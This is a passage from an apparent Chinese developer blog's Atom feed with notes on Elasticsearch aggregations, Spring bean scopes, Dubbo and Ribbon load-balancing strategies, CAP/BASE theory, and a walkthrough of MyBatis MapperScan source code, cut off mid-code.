class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;name_bucket&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;name.keyword&quot;,</span><br><span class="line">        &quot;order&quot;: &#123;</span><br><span class="line">          &quot;score_sum&quot;: &quot;desc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;score_sum&quot;: &#123;</span><br><span class="line">          &quot;sum&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;score&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ES基础"><a href="#ES基础" class="headerlink" title="ES基础"></a>ES基础</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Elasticsearch&quot;&gt;&lt;a href=&quot;#Elasticsearch&quot; class=&quot;headerlink&quot; title=&quot;Elasticsearch&quot;&gt;&lt;/a&gt;Elasticsearch&lt;/h2&gt;&lt;p&gt;Elasticsearch（简称ES）是一个分布式、</summary>
      
    
    
    
    <category term="Elasticsearch" scheme="http://fireflyingup.github.io/categories/Elasticsearch/"/>
    
    
    <category term="Elasticsearch" scheme="http://fireflyingup.github.io/tags/Elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://fireflyingup.github.io/2024/02/26/spring/"/>
    <id>http://fireflyingup.github.io/2024/02/26/spring/</id>
    <published>2024-02-26T02:07:52.803Z</published>
    <updated>2024-02-26T02:08:18.472Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spring的生命周期"><a href="#Spring的生命周期" class="headerlink" title="Spring的生命周期"></a>Spring的生命周期</h3><p>Spring 提供了多种不同的作用域（scope），它们决定了 Bean 的生命周期。</p><ol><li> singleton：单例作用域，在整个应用中只有一个实例，该实例在 Spring 容器初始化时创建。</li><li> prototype：原型作用域，每次调用都会创建一个新的实例，而不是使用单例。</li><li> request：请求作用域，当前 HTTP 请求的生命周期内有效。</li><li> session：会话作用域，整个 HTTP 会话的生命周期内有效。</li><li> global session：全局会话作用域，在 Portlet 应用程序中有效，对于全局 HTTP 会话的生命周期内有效。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Spring的生命周期&quot;&gt;&lt;a href=&quot;#Spring的生命周期&quot; class=&quot;headerlink&quot; title=&quot;Spring的生命周期&quot;&gt;&lt;/a&gt;Spring的生命周期&lt;/h3&gt;&lt;p&gt;Spring 提供了多种不同的作用域（scope），它们决定了 Be</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>dubbo</title>
    <link href="http://fireflyingup.github.io/2023/12/28/dubbo/"/>
    <id>http://fireflyingup.github.io/2023/12/28/dubbo/</id>
    <published>2023-12-28T02:09:01.000Z</published>
    <updated>2023-12-28T03:01:18.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h2><h3 id="负载均衡策略"><a href="#负载均衡策略" class="headerlink" title="负载均衡策略"></a>负载均衡策略</h3><ol><li>RandomLoadBalance:随机负载均衡。随机的选择一个。是Dubbo的<strong>默认</strong>负载均衡策略。</li><li>RoundRobinLoadBalance:轮询负载均衡。轮询选择一个。</li><li>LeastActiveLoadBalance:最少活跃调用数，相同活跃数的随机。活跃数指调用前后计数差。使慢的 Provider 收到更少请求，因为越慢的 Provider 的调用前后计数差会越大。</li><li>ConsistentHashLoadBalance:一致性哈希负载均衡。相同参数的请求总是落在同一台机器上。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Dubbo&quot;&gt;&lt;a href=&quot;#Dubbo&quot; class=&quot;headerlink&quot; title=&quot;Dubbo&quot;&gt;&lt;/a&gt;Dubbo&lt;/h2&gt;&lt;h3 id=&quot;负载均衡策略&quot;&gt;&lt;a href=&quot;#负载均衡策略&quot; class=&quot;headerlink&quot; title=&quot;负</summary>
      
    
    
    
    <category term="dubbo" scheme="http://fireflyingup.github.io/categories/dubbo/"/>
    
    
    <category term="dubbo" scheme="http://fireflyingup.github.io/tags/dubbo/"/>
    
  </entry>
  
  <entry>
    <title>cloud</title>
    <link href="http://fireflyingup.github.io/2023/12/28/cloud/"/>
    <id>http://fireflyingup.github.io/2023/12/28/cloud/</id>
    <published>2023-12-28T02:09:01.000Z</published>
    <updated>2024-03-12T06:12:51.493Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cloud"><a href="#Cloud" class="headerlink" title="Cloud"></a>Cloud</h2><h3 id="分布式系统的基本理论"><a href="#分布式系统的基本理论" class="headerlink" title="分布式系统的基本理论"></a>分布式系统的基本理论</h3><h4 id="CAP理论"><a href="#CAP理论" class="headerlink" title="CAP理论"></a>CAP理论</h4><p>CAP定理：一个分布式系统最多只能同时满足一致性（Consistence）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项。</p><ul><li>  一致性：所有节点在同一时间的看到的数据相同。</li><li>  可用性：读、写永远都能成功，即，服务一直可用。</li><li>  分区容错性：即使系统的某个分区遇到严重的故障，系统能继续提供服务。</li></ul><p>根据CAP定理，我们无法同时满足一致性、可用性、分区容错性这三个特性。那么，要舍弃哪个呢？</p><p>对于多数大型互联网应用的场景，主机众多、部署分散，节点故障、网络故障是常态，必须保证P；应用的目的是提供服务，因此通常也要保证A。既然要保证P和A，就只能不同程度的舍弃C，牺牲一些用户体验。严格来讲，部分应用的A也不必保证100%，因此，主流做法是首要保障P、在A和C之间取舍、重A轻C。</p><p>但是，对于金融服务，必须保证C；大规模金融服务几乎必然涉及网络分区，所以也要保证P；为了保证C、P，只能牺牲A（停止服务）。对于某些特殊的金融服务，需要7*24小时提供服务，则改为牺牲部分P（如单节点主从备份，故障切换），保障C、A。</p><h3 id="BASE定律"><a href="#BASE定律" class="headerlink" title="BASE定律"></a>BASE定律</h3><p>BASE定理是对CAP定理的延伸：即使无法做到强一致性（Strong Consistency），但应用可以采用适合的方式达到最终一致性（Eventual Consitency）。CAP中提到的一致性是强一致性，所谓“牺牲一致性”指牺牲强一致性保证弱一致性。</p><p>BASE是指基本可用（Basically Available）、软状态（ Soft State）、最终一致性（ Eventual Consistency）。</p><ul><li>  基本可用：出现故障的时候，允许损失部分可用性，即，保证核心可用。</li></ul><p>如，电商大促时，为了应对访问量激增，部分用户可能会被引导到降级页面，服务层也可能只提供降级服务</p><ul><li>  软状态：允许系统存在中间状态，而该中间状态不会影响系统整体可用性。</li></ul><p>软状态本质上是一种弱一致性，允许的软状态不能违背“基本可用”的要求。如，分布式存储中一般一份数据至少会有三个副本，允许不同节点间副本同步的延时（某些时刻副本数低于3）。</p><ul><li>  最终一致性：系统中的所有数据副本经过一定时间后，最终能够达到一致的状态。</li></ul><p>软状态的终极目标是最终一致性。如，分布式存储的副本数最终会达到稳定状态。</p><h3 id="负载均衡策略"><a href="#负载均衡策略" class="headerlink" title="负载均衡策略"></a>负载均衡策略</h3><h4 id="1-轮询策略"><a href="#1-轮询策略" class="headerlink" title="1.轮询策略"></a>1.轮询策略</h4><p>轮询策略：RoundRobinRule，按照一定的顺序依次调用服务实例。比如一共有 3 个服务，第一次调用服务 1，第二次调用服务 2，第三次调用服务3，依次类推。 此策略的配置设置如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springcloud-nacos-provider: # nacos中的服务id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule #设置负载均衡</span><br></pre></td></tr></table></figure><h4 id="2-权重策略"><a href="#2-权重策略" class="headerlink" title="2.权重策略"></a>2.权重策略</h4><p>权重策略：WeightedResponseTimeRule，根据每个服务提供者的响应时间分配一个权重，响应时间越长，权重越小，被选中的可能性也就越低。 它的实现原理是，刚开始使用轮询策略并开启一个计时器，每一段时间收集一次所有服务提供者的平均响应时间，然后再给每个服务提供者附上一个权重，权重越高被选中的概率也越大。 此策略的配置设置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springcloud-nacos-provider: # nacos中的服务id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.WeightedResponseTimeRule</span><br></pre></td></tr></table></figure><h4 id="3-随机策略"><a href="#3-随机策略" class="headerlink" title="3.随机策略"></a>3.随机策略</h4><p>随机策略：RandomRule，从服务提供者的列表中随机选择一个服务实例。 此策略的配置设置如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springcloud-nacos-provider: # nacos中的服务id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡</span><br></pre></td></tr></table></figure><h4 id="4-最小连接数策略"><a href="#4-最小连接数策略" class="headerlink" title="4.最小连接数策略"></a>4.最小连接数策略</h4><p>最小连接数策略：BestAvailableRule，也叫最小并发数策略，它是遍历服务提供者列表，选取连接数最小的⼀个服务实例。如果有相同的最小连接数，那么会调用轮询策略进行选取。 此策略的配置设置如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springcloud-nacos-provider: # nacos中的服务id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.BestAvailableRule #设置负载均衡</span><br></pre></td></tr></table></figure><h4 id="5-重试策略"><a href="#5-重试策略" class="headerlink" title="5.重试策略"></a>5.重试策略</h4><p>重试策略：RetryRule，按照轮询策略来获取服务，如果获取的服务实例为 null 或已经失效，则在指定的时间之内不断地进行重试来获取服务，如果超过指定时间依然没获取到服务实例则返回 null。 此策略的配置设置如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ribbon:</span><br><span class="line">  ConnectTimeout: 2000 # 请求连接的超时时间</span><br><span class="line">  ReadTimeout: 5000 # 请求处理的超时时间</span><br><span class="line">springcloud-nacos-provider: # nacos 中的服务 id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡</span><br></pre></td></tr></table></figure><h4 id="6-可用性敏感策略"><a href="#6-可用性敏感策略" class="headerlink" title="6.可用性敏感策略"></a>6.可用性敏感策略</h4><p>可用敏感性策略：AvailabilityFilteringRule，先过滤掉非健康的服务实例，然后再选择连接数较小的服务实例。 此策略的配置设置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springcloud-nacos-provider: # nacos中的服务id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.AvailabilityFilteringRule</span><br></pre></td></tr></table></figure><h4 id="7-区域敏感策略"><a href="#7-区域敏感策略" class="headerlink" title="7.区域敏感策略"></a>7.区域敏感策略</h4><p>区域敏感策略：ZoneAvoidanceRule，根据服务所在区域（zone）的性能和服务的可用性来选择服务实例，在没有区域的环境下，该策略和轮询策略类似。 此策略的配置设置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">springcloud-nacos-provider: # nacos中的服务id</span><br><span class="line">  ribbon:</span><br><span class="line">    NFLoadBalancerRuleClassName: com.netflix.loadbalancer.ZoneAvoidanceRule</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://monkeysayhi.github.io/2018/03/09/%E5%88%86%E5%B8%83%E5%BC%8F%E7%90%86%E8%AE%BA%EF%BC%9ACAP%E3%80%81BASE%E4%B8%8EACID/">CAP和BASE理论</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cloud&quot;&gt;&lt;a href=&quot;#Cloud&quot; class=&quot;headerlink&quot; title=&quot;Cloud&quot;&gt;&lt;/a&gt;Cloud&lt;/h2&gt;&lt;h3 id=&quot;分布式系统的基本理论&quot;&gt;&lt;a href=&quot;#分布式系统的基本理论&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="cloud" scheme="http://fireflyingup.github.io/categories/cloud/"/>
    
    
    <category term="cloud" scheme="http://fireflyingup.github.io/tags/cloud/"/>
    
  </entry>
  
  <entry>
    <title>mybatis</title>
    <link href="http://fireflyingup.github.io/2023/10/20/mybatis/"/>
    <id>http://fireflyingup.github.io/2023/10/20/mybatis/</id>
    <published>2023-10-20T15:10:04.000Z</published>
    <updated>2024-03-05T08:08:32.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h2><h3 id="MyBatis的作用"><a href="#MyBatis的作用" class="headerlink" title="MyBatis的作用"></a>MyBatis的作用</h3><p>MyBatis 是一流的持久性框架，支持自定义 SQL、存储过程和高级映射。 MyBatis 消除了几乎所有的 JDBC 代码以及手动设置参数和检索结果。 MyBatis 可以使用简单的 XML 或注释进行配置，并将原语、Map 接口和 Java POJO（普通旧 Java 对象）映射到数据库记录。</p><h3 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h3><h4 id="MapperScan注解"><a href="#MapperScan注解" class="headerlink" title="MapperScan注解"></a>MapperScan注解</h4><p>首先使用springboot的时候都需要在启动类上面写这个注解，并且标注basePackages是扫描的包前缀，通过这个basePackages，Mybatis会实现自己的代理类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Import(&#123;MapperScannerRegistrar.class&#125;)</span></span><br><span class="line"><span class="meta">@Repeatable(MapperScans.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MapperScan &#123;&#125;</span><br></pre></td></tr></table></figure><p>这个MapperScan注解上面有个@Import，表示这里面的类先去初始化，那我们深入MapperScannerRegistrar这个类。</p><h4 id="MapperScannerRegistrar"><a href="#MapperScannerRegistrar" class="headerlink" title="MapperScannerRegistrar"></a>MapperScannerRegistrar</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperScannerRegistrar</span> <span class="keyword">implements</span> <span class="title">ImportBeanDefinitionRegistrar</span>, <span class="title">ResourceLoaderAware</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>首先MapperScannerRegistrar实现了ImportBeanDefinitionRegistrar和ResourceLoaderAware两个接口类，ResourceLoaderAware的这个接口类有个setResourceLoader(ResourceLoader resourceLoader)的接口，但是MapperScannerRegistrar里面并没有实现，并且已经被@Deprecated弃用了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="meta">@Deprecated</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setResourceLoader</span><span class="params">(ResourceLoader resourceLoader)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// NOP</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>主要就是ImportBeanDefinitionRegistrar这个接口类的实现了，我们看一下他的registerBeanDefinitions实现，主要是针对MapperScannerConfigurer类生成了一个Bean的定义，然后加入@MapperScan注解里面参数的值，并使用BeanDefinitionRegistry的registerBeanDefinition注册到容器里面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinitions</span><span class="params">(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line">  AnnotationAttributes mapperScanAttrs = AnnotationAttributes</span><br><span class="line">      .fromMap(importingClassMetadata.getAnnotationAttributes(MapperScan.class.getName()));</span><br><span class="line">  <span class="keyword">if</span> (mapperScanAttrs != <span class="keyword">null</span>) &#123;</span><br><span class="line">    registerBeanDefinitions(importingClassMetadata, mapperScanAttrs, registry,</span><br><span class="line">        generateBaseBeanName(importingClassMetadata, <span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerBeanDefinitions</span><span class="params">(AnnotationMetadata annoMeta, AnnotationAttributes annoAttrs,</span></span></span><br><span class="line"><span class="function"><span class="params">    BeanDefinitionRegistry registry, String beanName)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 通过MapperScannerConfigurer类生成Bean定义构造器</span></span><br><span class="line">  BeanDefinitionBuilder builder = BeanDefinitionBuilder.genericBeanDefinition(MapperScannerConfigurer.class);</span><br><span class="line">  <span class="comment">// 下面都是在@MapperScan注解里面拿属性值塞到BeanDefinitionBuilder里面</span></span><br><span class="line">  builder.addPropertyValue(<span class="string">&quot;processPropertyPlaceHolders&quot;</span>, annoAttrs.getBoolean(<span class="string">&quot;processPropertyPlaceHolders&quot;</span>));</span><br><span class="line"></span><br><span class="line">  Class&lt;? extends Annotation&gt; annotationClass = annoAttrs.getClass(<span class="string">&quot;annotationClass&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!Annotation.class.equals(annotationClass)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;annotationClass&quot;</span>, annotationClass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Class&lt;?&gt; markerInterface = annoAttrs.getClass(<span class="string">&quot;markerInterface&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!Class.class.equals(markerInterface)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;markerInterface&quot;</span>, markerInterface);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Class&lt;? extends BeanNameGenerator&gt; generatorClass = annoAttrs.getClass(<span class="string">&quot;nameGenerator&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!BeanNameGenerator.class.equals(generatorClass)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;nameGenerator&quot;</span>, BeanUtils.instantiateClass(generatorClass));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Class&lt;? extends MapperFactoryBean&gt; mapperFactoryBeanClass = annoAttrs.getClass(<span class="string">&quot;factoryBean&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!MapperFactoryBean.class.equals(mapperFactoryBeanClass)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;mapperFactoryBeanClass&quot;</span>, mapperFactoryBeanClass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  String sqlSessionTemplateRef = annoAttrs.getString(<span class="string">&quot;sqlSessionTemplateRef&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (StringUtils.hasText(sqlSessionTemplateRef)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;sqlSessionTemplateBeanName&quot;</span>, annoAttrs.getString(<span class="string">&quot;sqlSessionTemplateRef&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  String sqlSessionFactoryRef = annoAttrs.getString(<span class="string">&quot;sqlSessionFactoryRef&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (StringUtils.hasText(sqlSessionFactoryRef)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;sqlSessionFactoryBeanName&quot;</span>, annoAttrs.getString(<span class="string">&quot;sqlSessionFactoryRef&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  List&lt;String&gt; basePackages = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">  basePackages.addAll(Arrays.stream(annoAttrs.getStringArray(<span class="string">&quot;basePackages&quot;</span>)).filter(StringUtils::hasText)</span><br><span class="line">      .collect(Collectors.toList()));</span><br><span class="line"></span><br><span class="line">  basePackages.addAll(Arrays.stream(annoAttrs.getClassArray(<span class="string">&quot;basePackageClasses&quot;</span>)).map(ClassUtils::getPackageName)</span><br><span class="line">      .collect(Collectors.toList()));</span><br><span class="line"><span class="comment">// 如果没有指定basePackage和basepackageClasses，那么就默认扫描@MapperScan注解这个类的文件夹下面。</span></span><br><span class="line">  <span class="keyword">if</span> (basePackages.isEmpty()) &#123;</span><br><span class="line">    basePackages.add(getDefaultBasePackage(annoMeta));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  String lazyInitialization = annoAttrs.getString(<span class="string">&quot;lazyInitialization&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (StringUtils.hasText(lazyInitialization)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;lazyInitialization&quot;</span>, lazyInitialization);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  String defaultScope = annoAttrs.getString(<span class="string">&quot;defaultScope&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!AbstractBeanDefinition.SCOPE_DEFAULT.equals(defaultScope)) &#123;</span><br><span class="line">    builder.addPropertyValue(<span class="string">&quot;defaultScope&quot;</span>, defaultScope);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  builder.addPropertyValue(<span class="string">&quot;basePackage&quot;</span>, StringUtils.collectionToCommaDelimitedString(basePackages));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// for spring-native</span></span><br><span class="line">  builder.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这里去注册这个bean到容器里面</span></span><br><span class="line">  registry.registerBeanDefinition(beanName, builder.getBeanDefinition());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">generateBaseBeanName</span><span class="params">(AnnotationMetadata importingClassMetadata, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> importingClassMetadata.getClassName() + <span class="string">&quot;#&quot;</span> + MapperScannerRegistrar.class.getSimpleName() + <span class="string">&quot;#&quot;</span> + index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getDefaultBasePackage</span><span class="params">(AnnotationMetadata importingClassMetadata)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ClassUtils.getPackageName(importingClassMetadata.getClassName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然注册了MapperScannerConfigurer这个bean，那我们去看看这个类的情况。</p><h4 id="MapperScannerConfigurer"><a href="#MapperScannerConfigurer" class="headerlink" title="MapperScannerConfigurer"></a>MapperScannerConfigurer</h4><p>首先我们看一下类的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperScannerConfigurer</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">BeanDefinitionRegistryPostProcessor</span>, <span class="title">InitializingBean</span>, <span class="title">ApplicationContextAware</span>, <span class="title">BeanNameAware</span> </span></span><br></pre></td></tr></table></figure><p>可以看到实现了四个接口，都是spring提供的接口。</p><p>BeanNameAware的setBeanName()方法和ApplicationContextAware的setApplicationContext()方法分别传入了上下文和bean名称，InitializingBean的afterPropertiesSet方法主要对basePackage进行了一个判空处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.applicationContext = applicationContext;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBeanName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.beanName = name;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   notNull(<span class="keyword">this</span>.basePackage, <span class="string">&quot;Property &#x27;basePackage&#x27; is required&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>主要的是BeanDefinitionRegistryPostProcessor的postProcessBeanDefinitionRegistry方法，里面定义了一个ClassPathMapperScanner类，最后调用了他的scan()方法。</p><h4 id="ClassPathMapperScanner"><a href="#ClassPathMapperScanner" class="headerlink" title="ClassPathMapperScanner"></a>ClassPathMapperScanner</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postProcessBeanDefinitionRegistry</span><span class="params">(BeanDefinitionRegistry registry)</span> </span>&#123;</span><br><span class="line">  <span 